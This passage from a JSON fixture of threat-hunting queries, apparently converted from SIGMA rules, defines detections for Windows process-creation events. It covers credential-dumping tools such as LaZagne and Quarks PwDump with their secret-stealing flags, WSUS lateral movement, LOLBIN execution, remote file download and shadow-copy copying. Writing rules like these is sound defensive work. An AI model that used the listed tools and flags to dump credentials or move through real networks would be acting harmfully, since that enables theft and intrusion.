            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\CustomShellHost.exe\" and (not tgt.process.image.path=\"C:\\Windows\\explorer.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 609
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the Quarks PwDump tool via commandline arguments",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "HackTool - Quarks PwDump Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\QuarksPwDump.exe\" or (tgt.process.cmdline in (\" -dhl\",\" --dump-hash-local\",\" -dhdc\",\" --dump-hash-domain-cached\",\" --dump-bitlocker\",\" -dhd \",\" --dump-hash-domain \",\"--ntds-file\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 610
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential LethalHTA Technique Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\svchost.exe\" and tgt.process.image.path contains \"\\mshta.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 611
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the LaZagne. A utility used to retrieve multiple types of passwords stored on a local computer.\nLaZagne has been leveraged multiple times by threat actors in order to dump credentials.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "HackTool - LaZagne Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\lazagne.exe\" or ((tgt.process.image.path contains \":\\PerfLogs\\\" or tgt.process.image.path contains \":\\ProgramData\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Tmp\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \"\\AppData\\\" or tgt.process.image.path contains \"\\Downloads\\\" or tgt.process.image.path contains \"\\Users\\Public\\\") and (tgt.process.cmdline contains \".exe all\" or tgt.process.cmdline contains \".exe browsers\" or tgt.process.cmdline contains \".exe chats\" or tgt.process.cmdline contains \".exe databases\" or tgt.process.cmdline contains \".exe games\" or tgt.process.cmdline contains \".exe git\" or tgt.process.cmdline contains \".exe mails\" or tgt.process.cmdline contains \".exe maven\" or tgt.process.cmdline contains \".exe memory\" or tgt.process.cmdline contains \".exe multimedia\" or tgt.process.cmdline contains \".exe sysadmin\" or tgt.process.cmdline contains \".exe unused\" or tgt.process.cmdline contains \".exe wifi\" or tgt.process.cmdline contains \".exe windows\")) or ((tgt.process.cmdline contains \"all \" or tgt.process.cmdline contains \"browsers \" or tgt.process.cmdline contains \"chats \" or tgt.process.cmdline contains \"databases \" or tgt.process.cmdline contains \"games \" or tgt.process.cmdline contains \"git \" or tgt.process.cmdline contains \"mails \" or tgt.process.cmdline contains \"maven \" or tgt.process.cmdline contains \"memory \" or tgt.process.cmdline contains \"multimedia \" or tgt.process.cmdline contains \"php \" or tgt.process.cmdline contains \"svn \" or tgt.process.cmdline contains \"sysadmin \" or tgt.process.cmdline contains \"unused \" or tgt.process.cmdline contains \"wifi \" or tgt.process.cmdline contains \"windows \") and (tgt.process.cmdline contains \"-oA\" or tgt.process.cmdline contains \"-oJ\" or tgt.process.cmdline contains \"-oN\" or tgt.process.cmdline contains \"-output\" or tgt.process.cmdline contains \"-password\" or tgt.process.cmdline contains \"-1Password\" or tgt.process.cmdline contains \"-apachedirectorystudio\" or tgt.process.cmdline contains \"-autologon\" or tgt.process.cmdline contains \"-ChromiumBased\" or tgt.process.cmdline contains \"-composer\" or tgt.process.cmdline contains \"-coreftp\" or tgt.process.cmdline contains \"-credfiles\" or tgt.process.cmdline contains \"-credman\" or tgt.process.cmdline contains \"-cyberduck\" or tgt.process.cmdline contains \"-dbvis\" or tgt.process.cmdline contains \"-EyeCon\" or tgt.process.cmdline contains \"-filezilla\" or tgt.process.cmdline contains \"-filezillaserver\" or tgt.process.cmdline contains \"-ftpnavigator\" or tgt.process.cmdline contains \"-galconfusion\" or tgt.process.cmdline contains \"-gitforwindows\" or tgt.process.cmdline contains \"-hashdump\" or tgt.process.cmdline contains \"-iisapppool\" or tgt.process.cmdline contains \"-IISCentralCertP\" or tgt.process.cmdline contains \"-kalypsomedia\" or tgt.process.cmdline contains \"-keepass\" or tgt.process.cmdline contains \"-keepassconfig\" or tgt.process.cmdline contains \"-lsa_secrets\" or tgt.process.cmdline contains \"-mavenrepositories\" or tgt.process.cmdline contains \"-memory_dump\" or tgt.process.cmdline contains \"-Mozilla\" or tgt.process.cmdline contains \"-mRemoteNG\" or tgt.process.cmdline contains \"-mscache\" or tgt.process.cmdline contains \"-opensshforwindows\" or tgt.process.cmdline contains \"-openvpn\" or tgt.process.cmdline contains \"-outlook\" or tgt.process.cmdline contains \"-pidgin\" or tgt.process.cmdline contains \"-postgresql\" or tgt.process.cmdline contains \"-psi-im\" or tgt.process.cmdline contains \"-puttycm\" or tgt.process.cmdline contains \"-pypykatz\" or tgt.process.cmdline contains \"-Rclone\" or tgt.process.cmdline contains \"-rdpmanager\" or tgt.process.cmdline contains \"-robomongo\" or tgt.process.cmdline contains \"-roguestale\" or tgt.process.cmdline contains \"-skype\" or tgt.process.cmdline contains \"-SQLDeveloper\" or tgt.process.cmdline contains \"-squirrel\" or tgt.process.cmdline contains \"-tortoise\" or tgt.process.cmdline contains \"-turba\" or tgt.process.cmdline contains \"-UCBrowser\" or tgt.process.cmdline contains \"-unattended\" or tgt.process.cmdline contains \"-vault\" or tgt.process.cmdline contains \"-vaultfiles\" or tgt.process.cmdline contains \"-vnc\" or tgt.process.cmdline contains \"-windows\" or tgt.process.cmdline contains \"-winscp\" or tgt.process.cmdline contains \"-wsl\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 612
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Use of Pcalua For Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\pcalua.exe\" and tgt.process.cmdline contains \" -a\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 613
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of Wscript/Cscript. These include processes such as rundll32 with uncommon exports or PowerShell spawning rundll32 or regsvr32.\nMalware such as Pikabot and Qakbot were seen using similar techniques as well as many others.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Cscript/Wscript Potentially Suspicious Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\wscript.exe\" or src.process.image.path contains \"\\cscript.exe\") and (tgt.process.image.path contains \"\\rundll32.exe\" or ((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and ((tgt.process.cmdline contains \"mshta\" and tgt.process.cmdline contains \"http\") or (tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"msiexec\")))) and (not (tgt.process.image.path contains \"\\rundll32.exe\" and (tgt.process.cmdline contains \"UpdatePerUserSystemParameters\" or tgt.process.cmdline contains \"PrintUIEntry\" or tgt.process.cmdline contains \"ClearMyTracksByProcess\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 614
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an interactive AT job, which may be used as a form of privilege escalation.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Interactive AT Job",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\at.exe\" and tgt.process.cmdline contains \"interactive\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 615
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of SharpWSUS or WSUSpendu, utilities that allow for lateral movement through WSUS.\nWindows Server Update Services (WSUS) is a critical component of Windows systems and is frequently configured in a way that allows an attacker to circumvent internal networking limitations.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1210"
            ],
            "name": "HackTool - SharpWSUS/WSUSpendu Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -Inject \" and (tgt.process.cmdline contains \" -PayloadArgs \" or tgt.process.cmdline contains \" -PayloadFile \")) or ((tgt.process.cmdline contains \" approve \" or tgt.process.cmdline contains \" create \" or tgt.process.cmdline contains \" check \" or tgt.process.cmdline contains \" delete \") and (tgt.process.cmdline contains \" /payload:\" or tgt.process.cmdline contains \" /payload=\" or tgt.process.cmdline contains \" /updateid:\" or tgt.process.cmdline contains \" /updateid=\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 616
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1588"
            ],
            "name": "Potential Execution of Sysinternals Tools",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -accepteula\" or tgt.process.cmdline contains \" /accepteula\" or tgt.process.cmdline contains \" \u2013accepteula\" or tgt.process.cmdline contains \" \u2014accepteula\" or tgt.process.cmdline contains \" \u2015accepteula\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 617
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Remote File Download Via Desktopimgdownldr Utility",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\desktopimgdownldr.exe\" and src.process.image.path contains \"\\desktopimgdownldr.exe\" and tgt.process.cmdline contains \"/lockscreenurl:http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 618
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Use of reg to get MachineGuid information",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1082"
            ],
            "name": "Suspicious Query of MachineGUID",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"SOFTWARE\\Microsoft\\Cryptography\" and tgt.process.cmdline contains \"/v \" and tgt.process.cmdline contains \"MachineGuid\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 619
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the builtin \"copy\" command that targets a shadow copy (sometimes used to copy registry hives that are in use)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1490"
            ],
            "name": "Copy From VolumeShadowCopy Via Cmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"copy \" and tgt.process.cmdline contains \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 620
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to Internet Explorer's (IE / Windows Internet properties) ZoneMap configuration of the \"HTTP\" and \"HTTPS\" protocols to point to the \"My Computer\" zone. This allows downloaded files from the Internet to be granted the same level of trust as files stored locally.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "IE ZoneMap Setting Downgraded To MyComputer Zone For HTTP Protocols Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" and tgt.process.cmdline contains \"http\" and tgt.process.cmdline contains \" 0\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 621
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1133"
            ],
            "name": "Unusual Child Process of dns.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\dns.exe\" and (not tgt.process.image.path contains \"\\conhost.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 622
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1059",
                "t1218"
            ],
            "name": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\mshta.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\" or src.process.image.path contains \"\\rundll32.exe\" or src.process.image.path contains \"\\cscript.exe\" or src.process.image.path contains \"\\wscript.exe\" or src.process.image.path contains \"\\wmiprvse.exe\" or src.process.image.path contains \"\\regsvr32.exe\") and (tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\nslookup.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\mshta.exe\")) and (not (tgt.process.image.path contains \"\\ccmcache\\\" or (src.process.cmdline contains \"\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\setup-scheduledtask.ps1\" or src.process.cmdline contains \"\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\set-selfhealing.ps1\" or src.process.cmdline contains \"\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\check-workspacehealth.ps1\" or src.process.cmdline contains \"\\nessus_\") or tgt.process.cmdline contains \"\\nessus_\" or (src.process.image.path contains \"\\mshta.exe\" and tgt.process.image.path contains \"\\mshta.exe\" and (src.process.cmdline contains \"C:\\MEM_Configmgr_\" and src.process.cmdline contains \"\\splash.hta\" and src.process.cmdline contains \"{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}\") and (tgt.process.cmdline contains \"C:\\MEM_Configmgr_\" and tgt.process.cmdline contains \"\\SMSSETUP\\BIN\\\" and tgt.process.cmdline contains \"\\autorun.hta\" and tgt.process.cmdline contains \"{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}\")))))) | columns tgt.process.cmdline,src.process.cmdline,tgt.process.image.path,tgt.process.image.path,src.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 623
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
